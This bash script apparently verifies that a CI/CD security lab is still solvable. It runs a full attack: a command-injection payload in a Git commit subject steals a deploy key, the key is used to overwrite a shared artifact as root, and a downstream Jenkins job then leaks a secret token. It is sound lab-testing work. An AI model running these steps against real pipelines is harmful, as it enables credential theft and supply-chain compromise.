#!/bin/bash
# dormouse-solve: the lab's automated artifact-integrity-hijack solver and self-check
# (CICD-SEC-8 Ungoverned 3rd-Party Services + CICD-SEC-9 Improper Artifact Integrity Validation).
#
# Run by Isoloom as an in-machine `exec` check from the Jenkins controller (which can reach Gitea at
# gitea:3000, Jenkins at 127.0.0.1:8080 and the artifact server at prod:22 / prod:80, and has git,
# curl, ssh/scp and base64). It walks the intended attack end-to-end and asserts it still works, so a
# learner whose box broke is told to reset it:
#
#   1. clone Cov/reportcov with the attacker's WRITE credentials (alice) and push a commit whose
#      SUBJECT is a command-injection payload. The reportcov pipeline echoes the subject through a
#      shell with the artifact-server key bound as $KEY, so the injected command drops base64($KEY)
#      onto the controller (the attacker's foothold = "YOUR SERVER" in the upstream write-up).
#   2. decode the stolen key and use it to scp a POISONED reportcov.sh onto the shared artifact
#      server (root@prod) — the shared artifact has no integrity controls, so the upload sticks.
#   3. build wonderland-dormouse: it fetches http://prod/reportcov.sh and runs it with the Global
#      `flag` token bound, so the poisoned script exfiltrates the token (reversed-base64) to the
#      build console.
#   4. assert that blob is in the dormouse console.
#
# Exit 0 = solvable. It proves the per-player flag was exfiltrated via the poisoned shared artifact,
# but NEVER prints the flag (that is the answer the player submits).
set -u

GITEA_HOST="gitea:3000"
GITEA="http://${GITEA_HOST}"
JENKINS="${DORMOUSE_JENKINS_URL:-http://127.0.0.1:8080}"
ORG_RC="Cov"; REPO_RC="reportcov"; JOB_RC="cov-reportcov"
JOB_DM="wonderland-dormouse"
PROD_HOST="${DORMOUSE_PROD_HOST:-prod}"
PROD_SSH_PORT="${DORMOUSE_PROD_SSH_PORT:-22}"
ARTIFACT_PATH="/var/www/localhost/htdocs/reportcov.sh"

ATTACKER="alice:alice"          # the attacker: WRITE access to Cov/reportcov
JAUTH="admin:admin"             # a Jenkins user who can read build consoles / trigger builds
FLAG_FILE="${DORMOUSE_FLAG_FILE:-/run/lab/casc_secrets/flag}"
DEADLINE=$(( $(date +%s) + ${DORMOUSE_DEADLINE:-420} ))

log()  { echo "dormouse-solve: $1" >&2; }
fail() { echo "FAIL: $1" >&2; exit 1; }
left() { [ "$(date +%s)" -lt "$DEADLINE" ]; }

# --- the expected exfiltration, computed from the flag the credential store holds -----------------
# Read from the same file JCasC used; never printed. Modern Jenkins credential masking also masks the
# plain base64 of a bound secret, so the poisoned artifact reverses the value first: `echo $flag |
# rev | base64`, i.e. base64 of "reverse(<flag>)\n". Reproduce exactly that and search the console.
[ -s "$FLAG_FILE" ] || fail "flag file $FLAG_FILE is missing or empty"
FLAG="$(tr -d '\r\n' < "$FLAG_FILE")"
[ -n "$FLAG" ] || fail "the staged flag is empty"
EXPECTED="$(printf '%s\n' "$FLAG" | rev | base64 | tr -d '\n')"
[ -n "$EXPECTED" ] || fail "could not compute the expected exfiltration"

jget()  { curl -s -m 10 -u "$JAUTH" "$@"; }
jcode() { curl -s -m 10 -o /dev/null -w '%{http_code}' -u "$JAUTH" "$1"; }

# Nudge an immediate build of a job (best effort; the 1-minute SCM poll covers it otherwise).
nudge() {  # $1 = job name
  local cj cr
  cj="$(mktemp)"
  cr="$(curl -s -m 10 -c "$cj" -u "$JAUTH" \
        "$JENKINS/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,%22%3A%22,//crumb)" 2>/dev/null)"
  [ -n "$cr" ] && curl -s -m 10 -o /dev/null -b "$cj" -u "$JAUTH" -H "$cr" \
        -X POST "$JENKINS/job/$1/build" 2>/dev/null
  rm -f "$cj"
}

# --- 1. wait for Gitea's repo and both Jenkins jobs to be ready -----------------------------------
log "waiting for the reportcov repository on Gitea..."
until curl -s -m 10 -o /dev/null -w '%{http_code}' -u "$ATTACKER" \
        "$GITEA/api/v1/repos/$ORG_RC/$REPO_RC/branches/main" 2>/dev/null | grep -q '^200$'; do
  left || fail "the Gitea repository never became ready"; sleep 3
done

log "waiting for the Jenkins pipeline jobs to exist..."
until [ "$(jcode "$JENKINS/job/$JOB_RC/api/json")" = "200" ] && [ "$(jcode "$JENKINS/job/$JOB_DM/api/json")" = "200" ]; do
  left || fail "the Jenkins jobs never appeared"; sleep 3
done

# --- 2. steal the artifact-server key via command injection in the reportcov pipeline -------------
WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"' EXIT
MARKER="rc-$(date +%s)-$$"
DROP="/tmp/$MARKER"            # where the injected command drops base64($KEY) on the controller
rm -f "$DROP"
export GIT_TERMINAL_PROMPT=0 GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null
export GIT_AUTHOR_NAME="alice" GIT_AUTHOR_EMAIL="alice@cov.example"
export GIT_COMMITTER_NAME="alice" GIT_COMMITTER_EMAIL="alice@cov.example"
REMOTE="http://$ATTACKER@$GITEA_HOST/$ORG_RC/$REPO_RC.git"

git clone -q "$REMOTE" "$WORK/repo" || fail "could not clone Cov/reportcov (attacker write creds)"
cd "$WORK/repo" || fail "clone directory missing"

# The injection payload, carried as the commit SUBJECT. The reportcov pipeline runs
#   sh "echo New change in Cov/reportcov: ${subject} - notifying ..."
# so the backticked command runs in the shell, with $KEY bound by the pipeline. It writes the
# (base64) key to $DROP on the controller — the attacker's exfiltration endpoint.
SUBJ='ping `printf %s "$KEY">'"$DROP"'`'
echo "// $MARKER" >> reportcov.sh    # an arbitrary change so there is something to commit
git add -A
git commit -q -m "$SUBJ"
git push -q "$REMOTE" HEAD:main || fail "could not push the injection commit to reportcov main"
log "pushed the command-injection commit to Cov/reportcov (subject carries the payload)"

nudge "$JOB_RC"
log "waiting for the reportcov pipeline to run the injection and drop the stolen key..."
KEYFILE="$WORK/artifact.key"
nudged=0
while left; do
  if [ -s "$DROP" ] && base64 -d < "$DROP" 2>/dev/null > "$KEYFILE" && grep -q "PRIVATE KEY" "$KEYFILE"; then
    chmod 400 "$KEYFILE"
    log "recovered the artifact-server private key via command injection ($(wc -c < "$KEYFILE") bytes)"
    break
  fi
  nudged=$((nudged+1))
  [ $(( nudged % 6 )) -eq 0 ] && nudge "$JOB_RC"
  sleep 5
done
[ -s "$KEYFILE" ] && grep -q "PRIVATE KEY" "$KEYFILE" || fail "the command injection never yielded the artifact-server key"

# --- 3. poison the shared artifact: scp a malicious reportcov.sh onto prod with the stolen key -----
POISON="$WORK/reportcov.sh"
{
  printf '#!/bin/sh\n'
  printf '# poisoned-%s\n' "$MARKER"
  printf 'echo "$flag" | rev | base64\n'
} > "$POISON"

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=10"
log "deploying the poisoned reportcov.sh to the shared artifact server with the stolen key..."
# shellcheck disable=SC2086
scp -O -q -i "$KEYFILE" -P "$PROD_SSH_PORT" $SSH_OPTS "$POISON" "root@$PROD_HOST:$ARTIFACT_PATH" 2>/dev/null \
  || ssh -i "$KEYFILE" -p "$PROD_SSH_PORT" $SSH_OPTS "root@$PROD_HOST" "cat > $ARTIFACT_PATH" < "$POISON" 2>/dev/null \
  || fail "could not deploy the poisoned artifact to the shared server with the stolen key"

# Confirm the shared server now serves our poisoned artifact (no integrity control stopped it).
left || fail "ran out of time before confirming the poisoned artifact"
until curl -fsS -m 10 "http://$PROD_HOST/reportcov.sh" 2>/dev/null | grep -qF "poisoned-$MARKER"; do
  left || fail "the artifact server never served the poisoned reportcov.sh"; sleep 3
done
log "the shared artifact server now serves the poisoned reportcov.sh"

# --- 4. run the downstream pipeline, which consumes the poisoned artifact with the token bound ----
nudge "$JOB_DM"
log "waiting for wonderland-dormouse to consume the poisoned artifact and exfiltrate the token..."
nudged=0
while left; do
  console="$(jget "$JENKINS/job/$JOB_DM/lastBuild/consoleText" 2>/dev/null)"
  if printf '%s' "$console" | grep -qF -- "$EXPECTED"; then
    log "OK: the shared reportcov.sh artifact was poisoned via the stolen deploy key, and the"
    log "    Global-scope flag (${#FLAG} chars) was exfiltrated by the dormouse pipeline that"
    log "    consumed it without integrity validation — reversed-base64 in the build console"
    log "    (flag itself not shown)."
    exit 0
  fi
  nudged=$((nudged+1))
  [ $(( nudged % 6 )) -eq 0 ] && nudge "$JOB_DM"   # re-nudge roughly every 30s
  sleep 5
done

fail "the exfiltrated token did not appear in the dormouse pipeline console before the deadline"
